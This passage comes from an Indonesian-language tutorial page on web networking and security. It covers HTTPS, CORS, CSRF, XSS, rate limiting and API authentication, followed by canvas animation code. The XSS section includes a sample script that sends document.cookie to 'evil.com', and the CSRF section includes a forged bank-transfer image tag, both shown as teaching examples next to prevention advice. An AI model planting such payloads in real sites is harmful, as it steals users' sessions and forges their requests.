        <canvas id="canvas-dns-flow" width="700" height="350" style="width:100%;max-width:700px;background:var(--surface);border-radius:8px"></canvas>
    </div>
    <div class="anim-controls">
        <button class="anim-btn" onclick="dnsFlowAnim.start()">Play DNS Resolution</button>
        <button class="anim-btn" onclick="dnsFlowAnim.reset()">Reset</button>
    </div>
</div>

<!-- ==================== 11. SECURITY IMPLEMENTATION ==================== -->
<h2 class="animate-in">11. Security Implementation</h2>

<div class="card animate-in">
    <h3 style="color:var(--red)">HTTPS Everywhere</h3>
    <p>HTTPS = HTTP + TLS. Semua komunikasi web modern <strong>wajib</strong> menggunakan HTTPS untuk melindungi dari:</p>
    <div class="card-grid-3">
        <div class="card">
            <span class="badge badge-red">Eavesdropping</span>
            <p>Man-in-the-middle bisa membaca traffic HTTP plaintext (password, cookies, data pribadi).</p>
        </div>
        <div class="card">
            <span class="badge badge-orange">Tampering</span>
            <p>Attacker bisa memodifikasi response (inject iklan, malware, atau mengubah data form).</p>
        </div>
        <div class="card">
            <span class="badge badge-yellow">Impersonation</span>
            <p>Tanpa certificate verification, attacker bisa berpura-pura menjadi server yang sah.</p>
        </div>
    </div>
</div>

<div class="card animate-in">
    <h3 style="color:var(--accent)">CORS (Cross-Origin Resource Sharing)</h3>
    <p>Browser memblokir request JavaScript ke domain berbeda (Same-Origin Policy). CORS adalah mekanisme yang memungkinkan server mengizinkan cross-origin requests.</p>

    <div class="handshake-vis">
        <div class="handshake-col">
            <div class="handshake-label">Browser (app.com)</div>
            <div class="handshake-label">API (api.com)</div>
        </div>
        <div class="handshake-msgs">
            <div class="hs-msg">
                <div class="hs-text">OPTIONS (Preflight)</div>
                <div class="hs-arrow"></div>
            </div>
            <div class="hs-msg reverse">
                <div class="hs-arrow"></div>
                <div class="hs-text">Access-Control-Allow-Origin: app.com</div>
            </div>
            <div class="hs-msg">
                <div class="hs-text">Actual POST Request</div>
                <div class="hs-arrow"></div>
            </div>
            <div class="hs-msg reverse">
                <div class="hs-arrow"></div>
                <div class="hs-text">200 OK + Data</div>
            </div>
        </div>
    </div>

    <div class="code-block"><span class="cm">// CORS Headers dari Server</span>
Access-Control-Allow-Origin: <span class="str">https://app.example.com</span>  <span class="cm">// Atau * (semua, JANGAN di production!)</span>
Access-Control-Allow-Methods: <span class="str">GET, POST, PUT, DELETE, OPTIONS</span>
Access-Control-Allow-Headers: <span class="str">Content-Type, Authorization</span>
Access-Control-Allow-Credentials: <span class="str">true</span>  <span class="cm">// Izinkan cookies</span>
Access-Control-Max-Age: <span class="num">86400</span>  <span class="cm">// Cache preflight selama 24 jam</span></div>

    <div class="warn-box">
        <strong>Penting:</strong> CORS hanya ditegakkan oleh browser! API call dari server (curl, Postman, backend) tidak terpengaruh CORS. Ini bukan mekanisme keamanan server, tapi perlindungan user di browser.
    </div>
</div>

<div class="card-grid animate-in">
    <div class="card">
        <h3 style="color:var(--red)">CSRF (Cross-Site Request Forgery)</h3>
        <p>Attacker membuat user yang sudah login mengirim request berbahaya tanpa sadar.</p>
        <div class="code-block"><span class="cm">&lt;!-- Halaman jahat attacker --&gt;</span>
&lt;img src=<span class="str">"https://bank.com/transfer?to=attacker&amount=1000000"</span>&gt;
<span class="cm">// Browser otomatis mengirim cookies bank.com!</span></div>
        <h4>Pencegahan:</h4>
        <ul>
            <li><strong>CSRF Token:</strong> Token unik per session yang harus disertakan di form/header</li>
            <li><strong>SameSite Cookie:</strong> Set cookie dengan SameSite=Strict atau Lax</li>
            <li><strong>Double Submit Cookie:</strong> Kirim token di cookie DAN header</li>
            <li><strong>Check Origin/Referer header</strong></li>
        </ul>
    </div>
    <div class="card">
        <h3 style="color:var(--orange)">XSS (Cross-Site Scripting)</h3>
        <p>Attacker meng-inject script berbahaya ke halaman web yang dilihat user lain.</p>
        <div class="code-block"><span class="cm">// Stored XSS - script tersimpan di database</span>
Comment: &lt;script&gt;<span class="fn">fetch</span>(<span class="str">'https://evil.com/steal?c='</span>+document.cookie)&lt;/script&gt;

<span class="cm">// Reflected XSS - via URL parameter</span>
https://app.com/search?q=&lt;script&gt;<span class="fn">alert</span>(<span class="str">'XSS'</span>)&lt;/script&gt;</div>
        <h4>Pencegahan:</h4>
        <ul>
            <li><strong>Output encoding/escaping:</strong> HTML entities untuk semua user input</li>
            <li><strong>Content Security Policy (CSP):</strong> Header yang membatasi sumber script</li>
            <li><strong>HttpOnly cookies:</strong> JavaScript tidak bisa akses cookies</li>
            <li><strong>Input validation & sanitization</strong></li>
        </ul>
    </div>
</div>

<div class="card animate-in">
    <h3 style="color:var(--green)">Rate Limiting</h3>
    <p>Membatasi jumlah request per client untuk mencegah abuse, DDoS, dan brute force:</p>
    <div class="card-grid">
        <div class="card">
            <h4>Algoritma Rate Limiting</h4>
            <ul>
                <li><strong>Fixed Window:</strong> Counter per interval (misal 100 req/menit). Masalah: burst di perbatasan window.</li>
                <li><strong>Sliding Window Log:</strong> Simpan timestamp setiap request. Lebih akurat tapi butuh lebih banyak memori.</li>
                <li><strong>Sliding Window Counter:</strong> Gabungan fixed window + weighted average. Efisien dan akurat.</li>
                <li><strong>Token Bucket:</strong> Token ditambahkan secara berkala. Setiap request mengambil 1 token. Mengizinkan burst terkontrol.</li>
                <li><strong>Leaky Bucket:</strong> Request masuk ke queue, diproses dengan rate konstan. Smoothing output.</li>
            </ul>
        </div>
        <div class="card">
            <h4>Response Headers</h4>
            <div class="code-block"><span class="cm">// Rate limit headers standar</span>
X-RateLimit-Limit: <span class="num">100</span>        <span class="cm">// Max request per window</span>
X-RateLimit-Remaining: <span class="num">42</span>    <span class="cm">// Sisa request</span>
X-RateLimit-Reset: <span class="num">1609459200</span>  <span class="cm">// Unix timestamp reset</span>
Retry-After: <span class="num">30</span>              <span class="cm">// Detik tunggu (saat 429)</span>

<span class="cm">// Response saat limit exceeded</span>
<span class="type">HTTP/1.1</span> <span class="num">429</span> Too Many Requests
{
  <span class="str">"error"</span>: <span class="str">"Rate limit exceeded"</span>,
  <span class="str">"retry_after"</span>: <span class="num">30</span>
}</div>
        </div>
    </div>
</div>

<div class="card animate-in">
    <h3 style="color:var(--accent3)">API Authentication Methods</h3>

    <div class="tabs">
        <button class="tab-btn active" data-tab="auth-apikey">API Key</button>
        <button class="tab-btn" data-tab="auth-oauth">OAuth 2.0</button>
        <button class="tab-btn" data-tab="auth-jwt">JWT</button>
        <button class="tab-btn" data-tab="auth-mtls">mTLS</button>
    </div>

    <div data-tab-content="auth-apikey" class="tab-content active">
        <div class="card">
            <h4>API Key Authentication</h4>
            <p>Metode paling sederhana. Client menyertakan API key di header atau query parameter.</p>
            <div class="code-block"><span class="cm">// Via Header (recommended)</span>
<span class="kw">GET</span> /api/v1/data <span class="type">HTTP/1.1</span>
X-API-Key: <span class="str">sk_live_abc123xyz789</span>

<span class="cm">// Via Query Parameter (kurang aman - bisa terlog)</span>
<span class="kw">GET</span> /api/v1/data?api_key=<span class="str">sk_live_abc123xyz789</span></div>
            <p><strong>Pro:</strong> Sederhana. <strong>Kontra:</strong> Tidak ada granularity (siapa yang pakai key?), sulit revoke per-user, bisa bocor di logs.</p>
        </div>
    </div>

    <div data-tab-content="auth-oauth" class="tab-content">
        <div class="card">
            <h4>OAuth 2.0 Authorization Code Flow</h4>
            <p>Standar industri untuk delegasi akses. User memberikan izin ke third-party app tanpa berbagi password.</p>
            <div class="step-list">
                <div class="step-item">
                    <div class="step-num">1</div>
                    <div class="step-text">User klik "Login with Google". App redirect ke Google Authorization Server.</div>
                </div>
                <div class="step-item">
                    <div class="step-num">2</div>
                    <div class="step-text">User login ke Google dan memberikan consent (izin scope: email, profile).</div>
                </div>
                <div class="step-item">
                    <div class="step-num">3</div>
                    <div class="step-text">Google redirect balik ke app dengan <strong>authorization code</strong> (one-time use).</div>
                </div>
                <div class="step-item">
                    <div class="step-num">4</div>
                    <div class="step-text">App backend menukar authorization code + client secret untuk <strong>access token</strong> dan <strong>refresh token</strong>.</div>
                </div>
                <div class="step-item">
                    <div class="step-num">5</div>
                    <div class="step-text">App menggunakan access token untuk mengakses Google API atas nama user.</div>
                </div>
            </div>
        </div>
    </div>

    <div data-tab-content="auth-jwt" class="tab-content">
        <div class="card">
            <h4>JWT (JSON Web Token)</h4>
            <p>Token self-contained yang membawa informasi (claims) dan ditandatangani secara kriptografis.</p>
            <div class="code-block"><span class="cm">// JWT terdiri dari 3 bagian: Header.Payload.Signature</span>
eyJhbGciOiJIUzI1NiJ9<span class="cm">.</span>eyJ1c2VyX2lkIjo0Miwicm9sZSI6ImFkbWluIiwiZXhwIjoxNjQwfQ<span class="cm">.</span>SflKxwRJSMeKKF2QT4fwpM

<span class="cm">// Decoded:</span>
<span class="cm">// Header</span>
{ <span class="str">"alg"</span>: <span class="str">"HS256"</span>, <span class="str">"typ"</span>: <span class="str">"JWT"</span> }

<span class="cm">// Payload (Claims)</span>
{
  <span class="str">"user_id"</span>: <span class="num">42</span>,
  <span class="str">"role"</span>: <span class="str">"admin"</span>,
  <span class="str">"exp"</span>: <span class="num">1640995200</span>,     <span class="cm">// Expiration</span>
  <span class="str">"iat"</span>: <span class="num">1640908800</span>,     <span class="cm">// Issued at</span>
  <span class="str">"iss"</span>: <span class="str">"api.example.com"</span> <span class="cm">// Issuer</span>
}

<span class="cm">// Signature</span>
HMACSHA256(
  base64(header) + <span class="str">"."</span> + base64(payload),
  secret_key
)</div>
            <div class="warn-box">
                <strong>JWT Pitfalls:</strong> JWT tidak bisa di-revoke (sampai expire). Gunakan short-lived access token (15 menit) + refresh token. Jangan simpan data sensitif di payload (bisa di-decode tanpa key)!
            </div>
        </div>
    </div>

    <div data-tab-content="auth-mtls" class="tab-content">
        <div class="card">
            <h4>mTLS (Mutual TLS)</h4>
            <p>Dalam TLS biasa, hanya server yang membuktikan identitasnya. Dalam mTLS, <strong>kedua pihak</strong> saling memverifikasi sertifikat.</p>
            <div class="handshake-vis">
                <div class="handshake-col">
                    <div class="handshake-label">Client</div>
                    <div class="handshake-label">Server</div>
                </div>
                <div class="handshake-msgs">
                    <div class="hs-msg">
                        <div class="hs-text">ClientHello</div>
                        <div class="hs-arrow"></div>
                    </div>
                    <div class="hs-msg reverse">
                        <div class="hs-arrow"></div>
                        <div class="hs-text">ServerHello + Server Cert</div>
                    </div>
                    <div class="hs-msg reverse">
                        <div class="hs-arrow"></div>
                        <div class="hs-text">CertificateRequest</div>
                    </div>
                    <div class="hs-msg">
                        <div class="hs-text">Client Cert + Verify</div>
                        <div class="hs-arrow"></div>
                    </div>
                    <div class="hs-msg">
                        <div class="hs-text">Finished</div>
                        <div class="hs-arrow"></div>
                    </div>
                    <div class="hs-msg reverse">
                        <div class="hs-arrow"></div>
                        <div class="hs-text">Finished</div>
                    </div>
                </div>
            </div>
            <p><strong>Use Cases:</strong> Microservices internal (service mesh seperti Istio), banking API, zero-trust architecture. Setiap service memiliki sertifikat sendiri, saling memverifikasi identitas.</p>
        </div>
    </div>
</div>

<div class="info-box animate-in">
    <strong>Security Checklist untuk Production API:</strong> HTTPS wajib | CORS yang ketat | CSRF token untuk form | XSS protection (CSP, sanitization) | Rate limiting | Input validation | SQL injection prevention (parameterized queries) | Authentication (JWT/OAuth) | Authorization (RBAC/ABAC) | Logging & monitoring | Security headers (HSTS, X-Content-Type-Options, X-Frame-Options)
</div>

<!-- ==================== REFERENCES ==================== -->
<div class="card animate-in">
    <h3>Referensi</h3>
    <ul>
        <li><strong>Kurose & Ross (2021).</strong> <em>Computer Networking: A Top-Down Approach</em>, 8th Edition. Pearson.</li>
        <li><strong>RFC 9110-9114 (2022).</strong> HTTP Semantics, HTTP/1.1, HTTP/2, HTTP/3.</li>
        <li><strong>RFC 9001 (2021).</strong> Using TLS to Secure QUIC.</li>
        <li><strong>RFC 8446 (2018).</strong> The Transport Layer Security (TLS) Protocol Version 1.3.</li>
        <li><strong>Fielding, R.T. (2000).</strong> Architectural Styles and the Design of Network-based Software Architectures. (REST).</li>
        <li><strong>gRPC Documentation.</strong> grpc.io - Protocol Buffers & gRPC framework.</li>
    </ul>
</div>
`;

// ==================== CANVAS ANIMATIONS ====================
var tcpHandshakeAnim = { start: function(){}, reset: function(){} };
var httpCompareAnim = { start: function(){}, reset: function(){} };
var tlsHandshakeAnim = { start: function(){}, reset: function(){} };
var dnsFlowAnim = { start: function(){}, reset: function(){} };

function initNetworkingAnimations() {
    const dpr = window.devicePixelRatio || 1;

    function setupCanvas(id, w, h) {
        const c = document.getElementById(id);
        if (!c) return null;
        const ctx = c.getContext('2d');
        c.width = w * dpr;
        c.height = h * dpr;
        c.style.width = w + 'px';
        c.style.height = h + 'px';
        ctx.scale(dpr, dpr);
        return { c, ctx, w, h };
    }

    function getColor(name) {
        const styles = getComputedStyle(document.documentElement);
        const map = {
            accent: styles.getPropertyValue('--accent').trim() || '#38bdf8',
            green: styles.getPropertyValue('--green').trim() || '#34d399',
            red: styles.getPropertyValue('--red').trim() || '#f87171',
            orange: styles.getPropertyValue('--orange').trim() || '#fb923c',
            yellow: styles.getPropertyValue('--yellow').trim() || '#fbbf24',
            accent3: styles.getPropertyValue('--accent3').trim() || '#a78bfa',
            text: styles.getPropertyValue('--text').trim() || '#e2e8f0',
            text2: styles.getPropertyValue('--text2').trim() || '#94a3b8',
            surface: styles.getPropertyValue('--surface').trim() || '#1e293b',
            surface2: styles.getPropertyValue('--surface2').trim() || '#334155',
            bg: styles.getPropertyValue('--bg').trim() || '#0f172a'
        };
        return map[name] || '#38bdf8';
    }

    function drawRoundedRect(ctx, x, y, w, h, r) {
        ctx.beginPath();
        ctx.moveTo(x + r, y);
        ctx.lineTo(x + w - r, y);
        ctx.quadraticCurveTo(x + w, y, x + w, y + r);
        ctx.lineTo(x + w, y + h - r);
        ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
        ctx.lineTo(x + r, y + h);
        ctx.quadraticCurveTo(x, y + h, x, y + h - r);
        ctx.lineTo(x, y + r);
        ctx.quadraticCurveTo(x, y, x + r, y);
        ctx.closePath();
    }

    function drawBox(ctx, x, y, w, h, color, label) {
        drawRoundedRect(ctx, x, y, w, h, 6);
        ctx.fillStyle = color + '22';
        ctx.fill();
        ctx.strokeStyle = color;
        ctx.lineWidth = 2;
        ctx.stroke();
        ctx.fillStyle = color;
        ctx.font = 'bold 13px system-ui, sans-serif';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';
        ctx.fillText(label, x + w / 2, y + h / 2);
    }

    function drawArrow(ctx, x1, y1, x2, y2, color, label, progress) {
        if (progress === undefined) progress = 1;
        var dx = x2 - x1, dy = y2 - y1;
        var ex = x1 + dx * progress, ey = y1 + dy * progress;

        ctx.beginPath();
        ctx.moveTo(x1, y1);
        ctx.lineTo(ex, ey);
        ctx.strokeStyle = color;
        ctx.lineWidth = 2;
        ctx.stroke();

        if (progress >= 0.95) {
            var angle = Math.atan2(dy, dx);
            ctx.beginPath();
            ctx.moveTo(ex, ey);
            ctx.lineTo(ex - 10 * Math.cos(angle - 0.4), ey - 10 * Math.sin(angle - 0.4));
            ctx.lineTo(ex - 10 * Math.cos(angle + 0.4), ey - 10 * Math.sin(angle + 0.4));
            ctx.closePath();
            ctx.fillStyle = color;
            ctx.fill();
        }

        if (label && progress > 0.3) {
            var mx = x1 + dx * 0.5, my = y1 + dy * 0.5 - 12;
            ctx.font = 'bold 11px system-ui, sans-serif';
            ctx.textAlign = 'center';
            ctx.fillStyle = color;
            ctx.fillText(label, mx, my);
        }
    }

    function drawPacket(ctx, x1, y1, x2, y2, color, label, progress) {
        var px = x1 + (x2 - x1) * progress;
        var py = y1 + (y2 - y1) * progress;

        drawRoundedRect(ctx, px - 30, py - 12, 60, 24, 12);
        ctx.fillStyle = color + '33';
        ctx.fill();
        ctx.strokeStyle = color;
        ctx.lineWidth = 1.5;
        ctx.stroke();
        ctx.fillStyle = color;
        ctx.font = 'bold 10px system-ui, sans-serif';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';
        ctx.fillText(label, px, py);
    }

    // ========== TCP HANDSHAKE ANIMATION ==========
    (function() {
        var setup = setupCanvas('canvas-tcp-handshake', 700, 320);
        if (!setup) return;
        var ctx = setup.ctx, w = setup.w, h = setup.h;
        var step = -1, progress = 0, animId = null, running = false;

        var steps = [
            { from: 'left', label: 'SYN (seq=100)', desc: 'Client mengirim SYN, state: SYN_SENT' },
            { from: 'right', label: 'SYN-ACK (seq=300, ack=101)', desc: 'Server menerima, state: SYN_RECEIVED' },
            { from: 'left', label: 'ACK (ack=301)', desc: 'Koneksi ESTABLISHED!' },
            { from: 'left', label: 'DATA: "Hello Server"', desc: 'Data transfer dimulai' },
            { from: 'right', label: 'ACK + DATA: "Hello Client"', desc: 'Server merespon' }
        ];

        function draw() {
            ctx.clearRect(0, 0, w, h);

            var lx = 80, rx = w - 80, topY = 40, botY = h - 20;

            // Title
            ctx.font = 'bold 14px system-ui, sans-serif';
            ctx.textAlign = 'center';
            ctx.fillStyle = getColor('text');
            ctx.fillText('TCP 3-Way Handshake + Data Transfer', w / 2, 20);

            // Draw endpoints
            drawBox(ctx, lx - 40, topY, 80, 32, getColor('accent'), 'Client');
            drawBox(ctx, rx - 40, topY, 80, 32, getColor('green'), 'Server');

            // Draw timeline lines
            ctx.beginPath();
            ctx.setLineDash([4, 4]);
            ctx.moveTo(lx, topY + 36);
            ctx.lineTo(lx, botY);
            ctx.moveTo(rx, topY + 36);
            ctx.lineTo(rx, botY);
            ctx.strokeStyle = getColor('surface2');
            ctx.lineWidth = 1;
            ctx.stroke();
            ctx.setLineDash([]);

            var spacing = 48;
            var startY = topY + 55;

            for (var i = 0; i <= step; i++) {
                var y = startY + i * spacing;
                var s = steps[i];
                var p = (i < step) ? 1 : progress;
                var color;

                if (i < 3) color = (s.from === 'left') ? getColor('accent') : getColor('green');
                else color = (s.from === 'left') ? getColor('orange') : getColor('accent3');

                if (s.from === 'left') {
                    drawArrow(ctx, lx + 5, y, rx - 5, y, color, s.label, p);
                } else {
                    drawArrow(ctx, rx - 5, y, lx + 5, y, color, s.label, p);
                }

                if (p >= 1) {
                    ctx.font = '11px system-ui, sans-serif';
                    ctx.textAlign = 'center';
                    ctx.fillStyle = getColor('text2');
                    ctx.fillText(s.desc, w / 2, y + 18);
                }
            }

            // Draw state indicators
            if (step >= 0) {
                ctx.font = '10px system-ui, sans-serif';
                ctx.textAlign = 'center';
                if (step === 0) {
                    ctx.fillStyle = getColor('yellow');
                    ctx.fillText('SYN_SENT', lx, startY - 12);
                } else if (step === 1) {
                    ctx.fillStyle = getColor('yellow');
                    ctx.fillText('SYN_SENT', lx, startY - 12);
                    ctx.fillStyle = getColor('orange');
                    ctx.fillText('SYN_RCVD', rx, startY + spacing - 12);
                } else if (step >= 2) {
                    ctx.fillStyle = getColor('green');
                    ctx.fillText('ESTABLISHED', lx, startY + 2 * spacing - 12);
                    ctx.fillText('ESTABLISHED', rx, startY + 2 * spacing - 12);
                }
            }
        }

        function animate() {
            if (!running) return;
            progress += 0.025;
            if (progress >= 1) {
                progress = 1;
                draw();
                if (step < steps.length - 1) {
                    setTimeout(function() {
                        step++;
                        progress = 0;
                        if (running) animId = requestAnimationFrame(animate);
                    }, 600);
                    return;
                } else {
                    running = false;
                    return;
                }
            }
            draw();
            animId = requestAnimationFrame(animate);
        }

        tcpHandshakeAnim.start = function() {
            if (running) return;
            step = 0; progress = 0; running = true;
            animate();
        };
        tcpHandshakeAnim.reset = function() {
            running = false;
            if (animId) cancelAnimationFrame(animId);
            step = -1; progress = 0;
            draw();
        };
        draw();
    })();

    // ========== HTTP COMPARISON ANIMATION ==========
    (function() {
        var setup = setupCanvas('canvas-http-compare', 700, 350);
        if (!setup) return;
        var ctx = setup.ctx, w = setup.w, h = setup.h;
        var animId = null, running = false, startTime = 0;
        var totalDuration = 6000; // 6 seconds animation

        var resources = ['HTML', 'CSS', 'JS', 'IMG1', 'IMG2', 'Font'];

        function draw(elapsed) {
            ctx.clearRect(0, 0, w, h);
            var t = elapsed / totalDuration;

            // Title
            ctx.font = 'bold 13px system-ui, sans-serif';
            ctx.textAlign = 'center';
            ctx.fillStyle = getColor('text');
            ctx.fillText('Memuat 6 Resource: HTTP/1.1 vs HTTP/2 vs HTTP/3', w / 2, 18);

            var colW = w / 3 - 10;
            var versions = [
                { name: 'HTTP/1.1', color: getColor('red'), x: 10 },
                { name: 'HTTP/2', color: getColor('accent'), x: w / 3 + 5 },
                { name: 'HTTP/3', color: getColor('green'), x: 2 * w / 3 }
            ];

            versions.forEach(function(ver, vi) {
                var bx = ver.x, topY = 35;

                // Version label
                drawRoundedRect(ctx, bx, topY, colW, 24, 4);
                ctx.fillStyle = ver.color + '22';
                ctx.fill();
                ctx.strokeStyle = ver.color;
                ctx.lineWidth = 1;
                ctx.stroke();
                ctx.font = 'bold 11px system-ui, sans-serif';
                ctx.textAlign = 'center';
                ctx.fillStyle = ver.color;
                ctx.fillText(ver.name, bx + colW / 2, topY + 15);

                var startY = topY + 35;
                var barH = 16;
                var gap = 6;
                var maxW = colW - 20;

                resources.forEach(function(res, ri) {
                    var y = startY + ri * (barH + gap);
                    var delay, duration, barW;

                    if (vi === 0) {
                        // HTTP/1.1: sequential with max 6 parallel connections
                        // But head-of-line blocking means mostly sequential
                        delay = ri * 0.15;
                        duration = 0.14;
                        barW = maxW * 0.7;
                    } else if (vi === 1) {
                        // HTTP/2: multiplexed, all start together, TCP HoL can slow
                        delay = 0.05 + ri * 0.02;
                        duration = 0.12;
                        barW = maxW * 0.8;
                    } else {
                        // HTTP/3: multiplexed, no HoL blocking, fastest
                        delay = 0.02 + ri * 0.01;
                        duration = 0.10;
                        barW = maxW * 0.9;
                    }

                    // Resource label
                    ctx.font = '10px system-ui, sans-serif';
                    ctx.textAlign = 'left';
                    ctx.fillStyle = getColor('text2');
                    ctx.fillText(res, bx + 4, y + barH / 2 + 3);

                    // Background bar
                    var barX = bx + 38;
                    drawRoundedRect(ctx, barX, y, maxW - 38, barH, 3);
                    ctx.fillStyle = getColor('surface2') + '44';
                    ctx.fill();

                    // Progress bar
                    var p = Math.max(0, Math.min(1, (t - delay) / duration));
                    if (p > 0) {
                        var pw = (maxW - 38) * p;
                        drawRoundedRect(ctx, barX, y, Math.max(6, pw), barH, 3);
                        ctx.fillStyle = ver.color + (p >= 1 ? '88' : '55');
                        ctx.fill();

                        if (p >= 1) {
                            ctx.font = 'bold 9px system-ui, sans-serif';
                            ctx.textAlign = 'center';
                            ctx.fillStyle = ver.color;
                            ctx.fillText('OK', barX + (maxW - 38) / 2, y + barH / 2 + 3);
                        }
                    }
                });

                // Completion time indicator
                var allDone = true;
                var maxEnd = 0;
                resources.forEach(function(res, ri) {
                    var delay, duration;
                    if (vi === 0) { delay = ri * 0.15; duration = 0.14; }
                    else if (vi === 1) { delay = 0.05 + ri * 0.02; duration = 0.12; }
                    else { delay = 0.02 + ri * 0.01; duration = 0.10; }
                    var end = delay + duration;
                    if (end > maxEnd) maxEnd = end;
                    if (t < end) allDone = false;
                });

                var bottomY = startY + resources.length * (barH + gap) + 8;
                if (allDone) {
                    ctx.font = 'bold 11px system-ui, sans-serif';
                    ctx.textAlign = 'center';
                    ctx.fillStyle = ver.color;
                    var ms = Math.round(maxEnd * totalDuration);
                    ctx.fillText('Selesai: ' + ms + 'ms', bx + colW / 2, bottomY);
                }
            });

            // Legend at bottom
            var ly = h - 30;
            ctx.font = '10px system-ui, sans-serif';
            ctx.textAlign = 'center';
            ctx.fillStyle = getColor('text2');
            ctx.fillText('HTTP/1.1: sequential (HoL blocking) | HTTP/2: multiplexed (TCP HoL) | HTTP/3: multiplexed (no HoL, QUIC)', w / 2, ly);
        }

        function animate(ts) {
            if (!running) return;
            var elapsed = ts - startTime;
            draw(Math.min(elapsed, totalDuration));
            if (elapsed < totalDuration) {
                animId = requestAnimationFrame(animate);
            } else {
                running = false;
            }
        }

        httpCompareAnim.start = function() {
            if (running) return;
            running = true;
            startTime = performance.now();
            animId = requestAnimationFrame(animate);
        };
        httpCompareAnim.reset = function() {
            running = false;
            if (animId) cancelAnimationFrame(animId);
            draw(0);
        };
        draw(0);
    })();

    // ========== TLS HANDSHAKE ANIMATION ==========
    (function() {
        var setup = setupCanvas('canvas-tls-handshake', 700, 350);
        if (!setup) return;
        var ctx = setup.ctx, w = setup.w, h = setup.h;
        var step = -1, progress = 0, animId = null, running = false;

        var steps = [
            { from: 'left', label: 'ClientHello + KeyShare (ECDHE)', desc: 'Supported versions, cipher suites, key share', color: 'accent' },
            { from: 'right', label: 'ServerHello + KeyShare', desc: 'Selected cipher suite, server key share', color: 'green' },
            { from: 'right', label: 'EncryptedExtensions + Certificate', desc: 'Server cert + chain (sudah terenkripsi!)', color: 'green' },
            { from: 'right', label: 'CertificateVerify + Finished', desc: 'Signature bukti kepemilikan private key', color: 'green' },
            { from: 'left', label: 'Finished + [App Data]', desc: 'Handshake selesai! 1-RTT. Data bisa langsung dikirim.', color: 'accent' }
        ];

        function draw() {
            ctx.clearRect(0, 0, w, h);

            var lx = 90, rx = w - 90, topY = 40, botY = h - 20;

            ctx.font = 'bold 14px system-ui, sans-serif';
            ctx.textAlign = 'center';
            ctx.fillStyle = getColor('text');
            ctx.fillText('TLS 1.3 Handshake (1-RTT)', w / 2, 20);

            drawBox(ctx, lx - 45, topY, 90, 30, getColor('accent'), 'Client');
            drawBox(ctx, rx - 45, topY, 90, 30, getColor('green'), 'Server');

            ctx.beginPath();
            ctx.setLineDash([4, 4]);
            ctx.moveTo(lx, topY + 34);
            ctx.lineTo(lx, botY);
            ctx.moveTo(rx, topY + 34);
            ctx.lineTo(rx, botY);
            ctx.strokeStyle = getColor('surface2');
            ctx.lineWidth = 1;
            ctx.stroke();
            ctx.setLineDash([]);

            // Encryption boundary
            if (step >= 2) {
                var encY = topY + 55 + 1.5 * 50;
                ctx.beginPath();
                ctx.setLineDash([6, 3]);
                ctx.moveTo(lx - 30, encY);
                ctx.lineTo(rx + 30, encY);
                ctx.strokeStyle = getColor('yellow') + '66';
                ctx.lineWidth = 1;
                ctx.stroke();
                ctx.setLineDash([]);
                ctx.font = '10px system-ui, sans-serif';
                ctx.fillStyle = getColor('yellow');
                ctx.textAlign = 'right';
                ctx.fillText('Encrypted from here', rx + 28, encY - 5);
            }

            var spacing = 50;
            var startY = topY + 55;

            for (var i = 0; i <= step; i++) {
                var y = startY + i * spacing;
                var s = steps[i];
                var p = (i < step) ? 1 : progress;
                var c = getColor(s.color);

                if (s.from === 'left') {
                    drawArrow(ctx, lx + 5, y, rx - 5, y, c, s.label, p);
                } else {
                    drawArrow(ctx, rx - 5, y, lx + 5, y, c, s.label, p);
                }

                if (p >= 1) {
                    ctx.font = '10px system-ui, sans-serif';
                    ctx.textAlign = 'center';
                    ctx.fillStyle = getColor('text2');
                    ctx.fillText(s.desc, w / 2, y + 16);
                }
            }

            // RTT indicator
            if (step >= 4) {
                ctx.font = 'bold 12px system-ui, sans-serif';
                ctx.textAlign = 'left';
                ctx.fillStyle = getColor('green');
                ctx.fillText('1-RTT Complete!', 15, startY + 2 * spacing);
                ctx.font = '10px system-ui, sans-serif';
                ctx.fillStyle = getColor('text2');
                ctx.fillText('(vs 2-RTT di TLS 1.2)', 15, startY + 2 * spacing + 14);
            }
        }

        function animate() {
            if (!running) return;
            progress += 0.025;
            if (progress >= 1) {
                progress = 1;
                draw();
                if (step < steps.length - 1) {
                    setTimeout(function() {
                        step++;
                        progress = 0;
                        if (running) animId = requestAnimationFrame(animate);
                    }, 500);
                    return;
                } else {
                    running = false;
                    return;
                }
            }
            draw();
            animId = requestAnimationFrame(animate);
        }

        tlsHandshakeAnim.start = function() {
            if (running) return;
            step = 0; progress = 0; running = true;
            animate();
        };
        tlsHandshakeAnim.reset = function() {
            running = false;
            if (animId) cancelAnimationFrame(animId);
            step = -1; progress = 0;
            draw();
        };
        draw();
    })();

    // ========== DNS RESOLUTION FLOW ANIMATION ==========
    (function() {
        var setup = setupCanvas('canvas-dns-flow', 700, 350);
        if (!setup) return;
        var ctx = setup.ctx, w = setup.w, h = setup.h;
        var step = -1, progress = 0, animId = null, running = false;

        // Node positions
        var nodes = {
            browser: { x: 80, y: 60, label: 'Browser', color: 'accent' },
            resolver: { x: 80, y: 180, label: 'Recursive\nResolver', color: 'accent3' },
            root: { x: 350, y: 60, label: 'Root Server\n(a.root-servers.net)', color: 'red' },
            tld: { x: 560, y: 60, label: 'TLD Server\n(.com)', color: 'orange' },
            auth: { x: 560, y: 180, label: 'Auth NS\n(ns1.google.com)', color: 'green' },
            result: { x: 350, y: 290, label: 'IP: 142.250.185.46', color: 'green' }
        };

        var steps = [
            { from: 'browser', to: 'resolver', label: 'Query: google.com', desc: 'Browser ke recursive resolver (ISP/8.8.8.8)' },
            { from: 'resolver', to: 'root', label: 'Query: .com?', desc: 'Resolver bertanya root server tentang .com TLD' },
            { from: 'root', to: 'resolver', label: 'Referral: .com NS', desc: 'Root mengarahkan ke TLD name server .com' },
            { from: 'resolver', to: 'tld', label: 'Query: google.com?', desc: 'Resolver bertanya TLD server .com' },
            { from: 'tld', to: 'resolver', label: 'Referral: google NS', desc: 'TLD mengarahkan ke authoritative NS google' },
            { from: 'resolver', to: 'auth', label: 'Query: google.com A?', desc: 'Resolver bertanya authoritative NS' },
            { from: 'auth', to: 'resolver', label: 'A: 142.250.185.46', desc: 'Auth NS mengembalikan IP address!' },
            { from: 'resolver', to: 'browser', label: '142.250.185.46', desc: 'Resolver mengembalikan IP ke browser + cache' }
        ];

        function drawNode(key) {
            var n = nodes[key];
            var lines = n.label.split('\n');
            var bw = 110, bh = lines.length > 1 ? 42 : 30;
            var c = getColor(n.color);

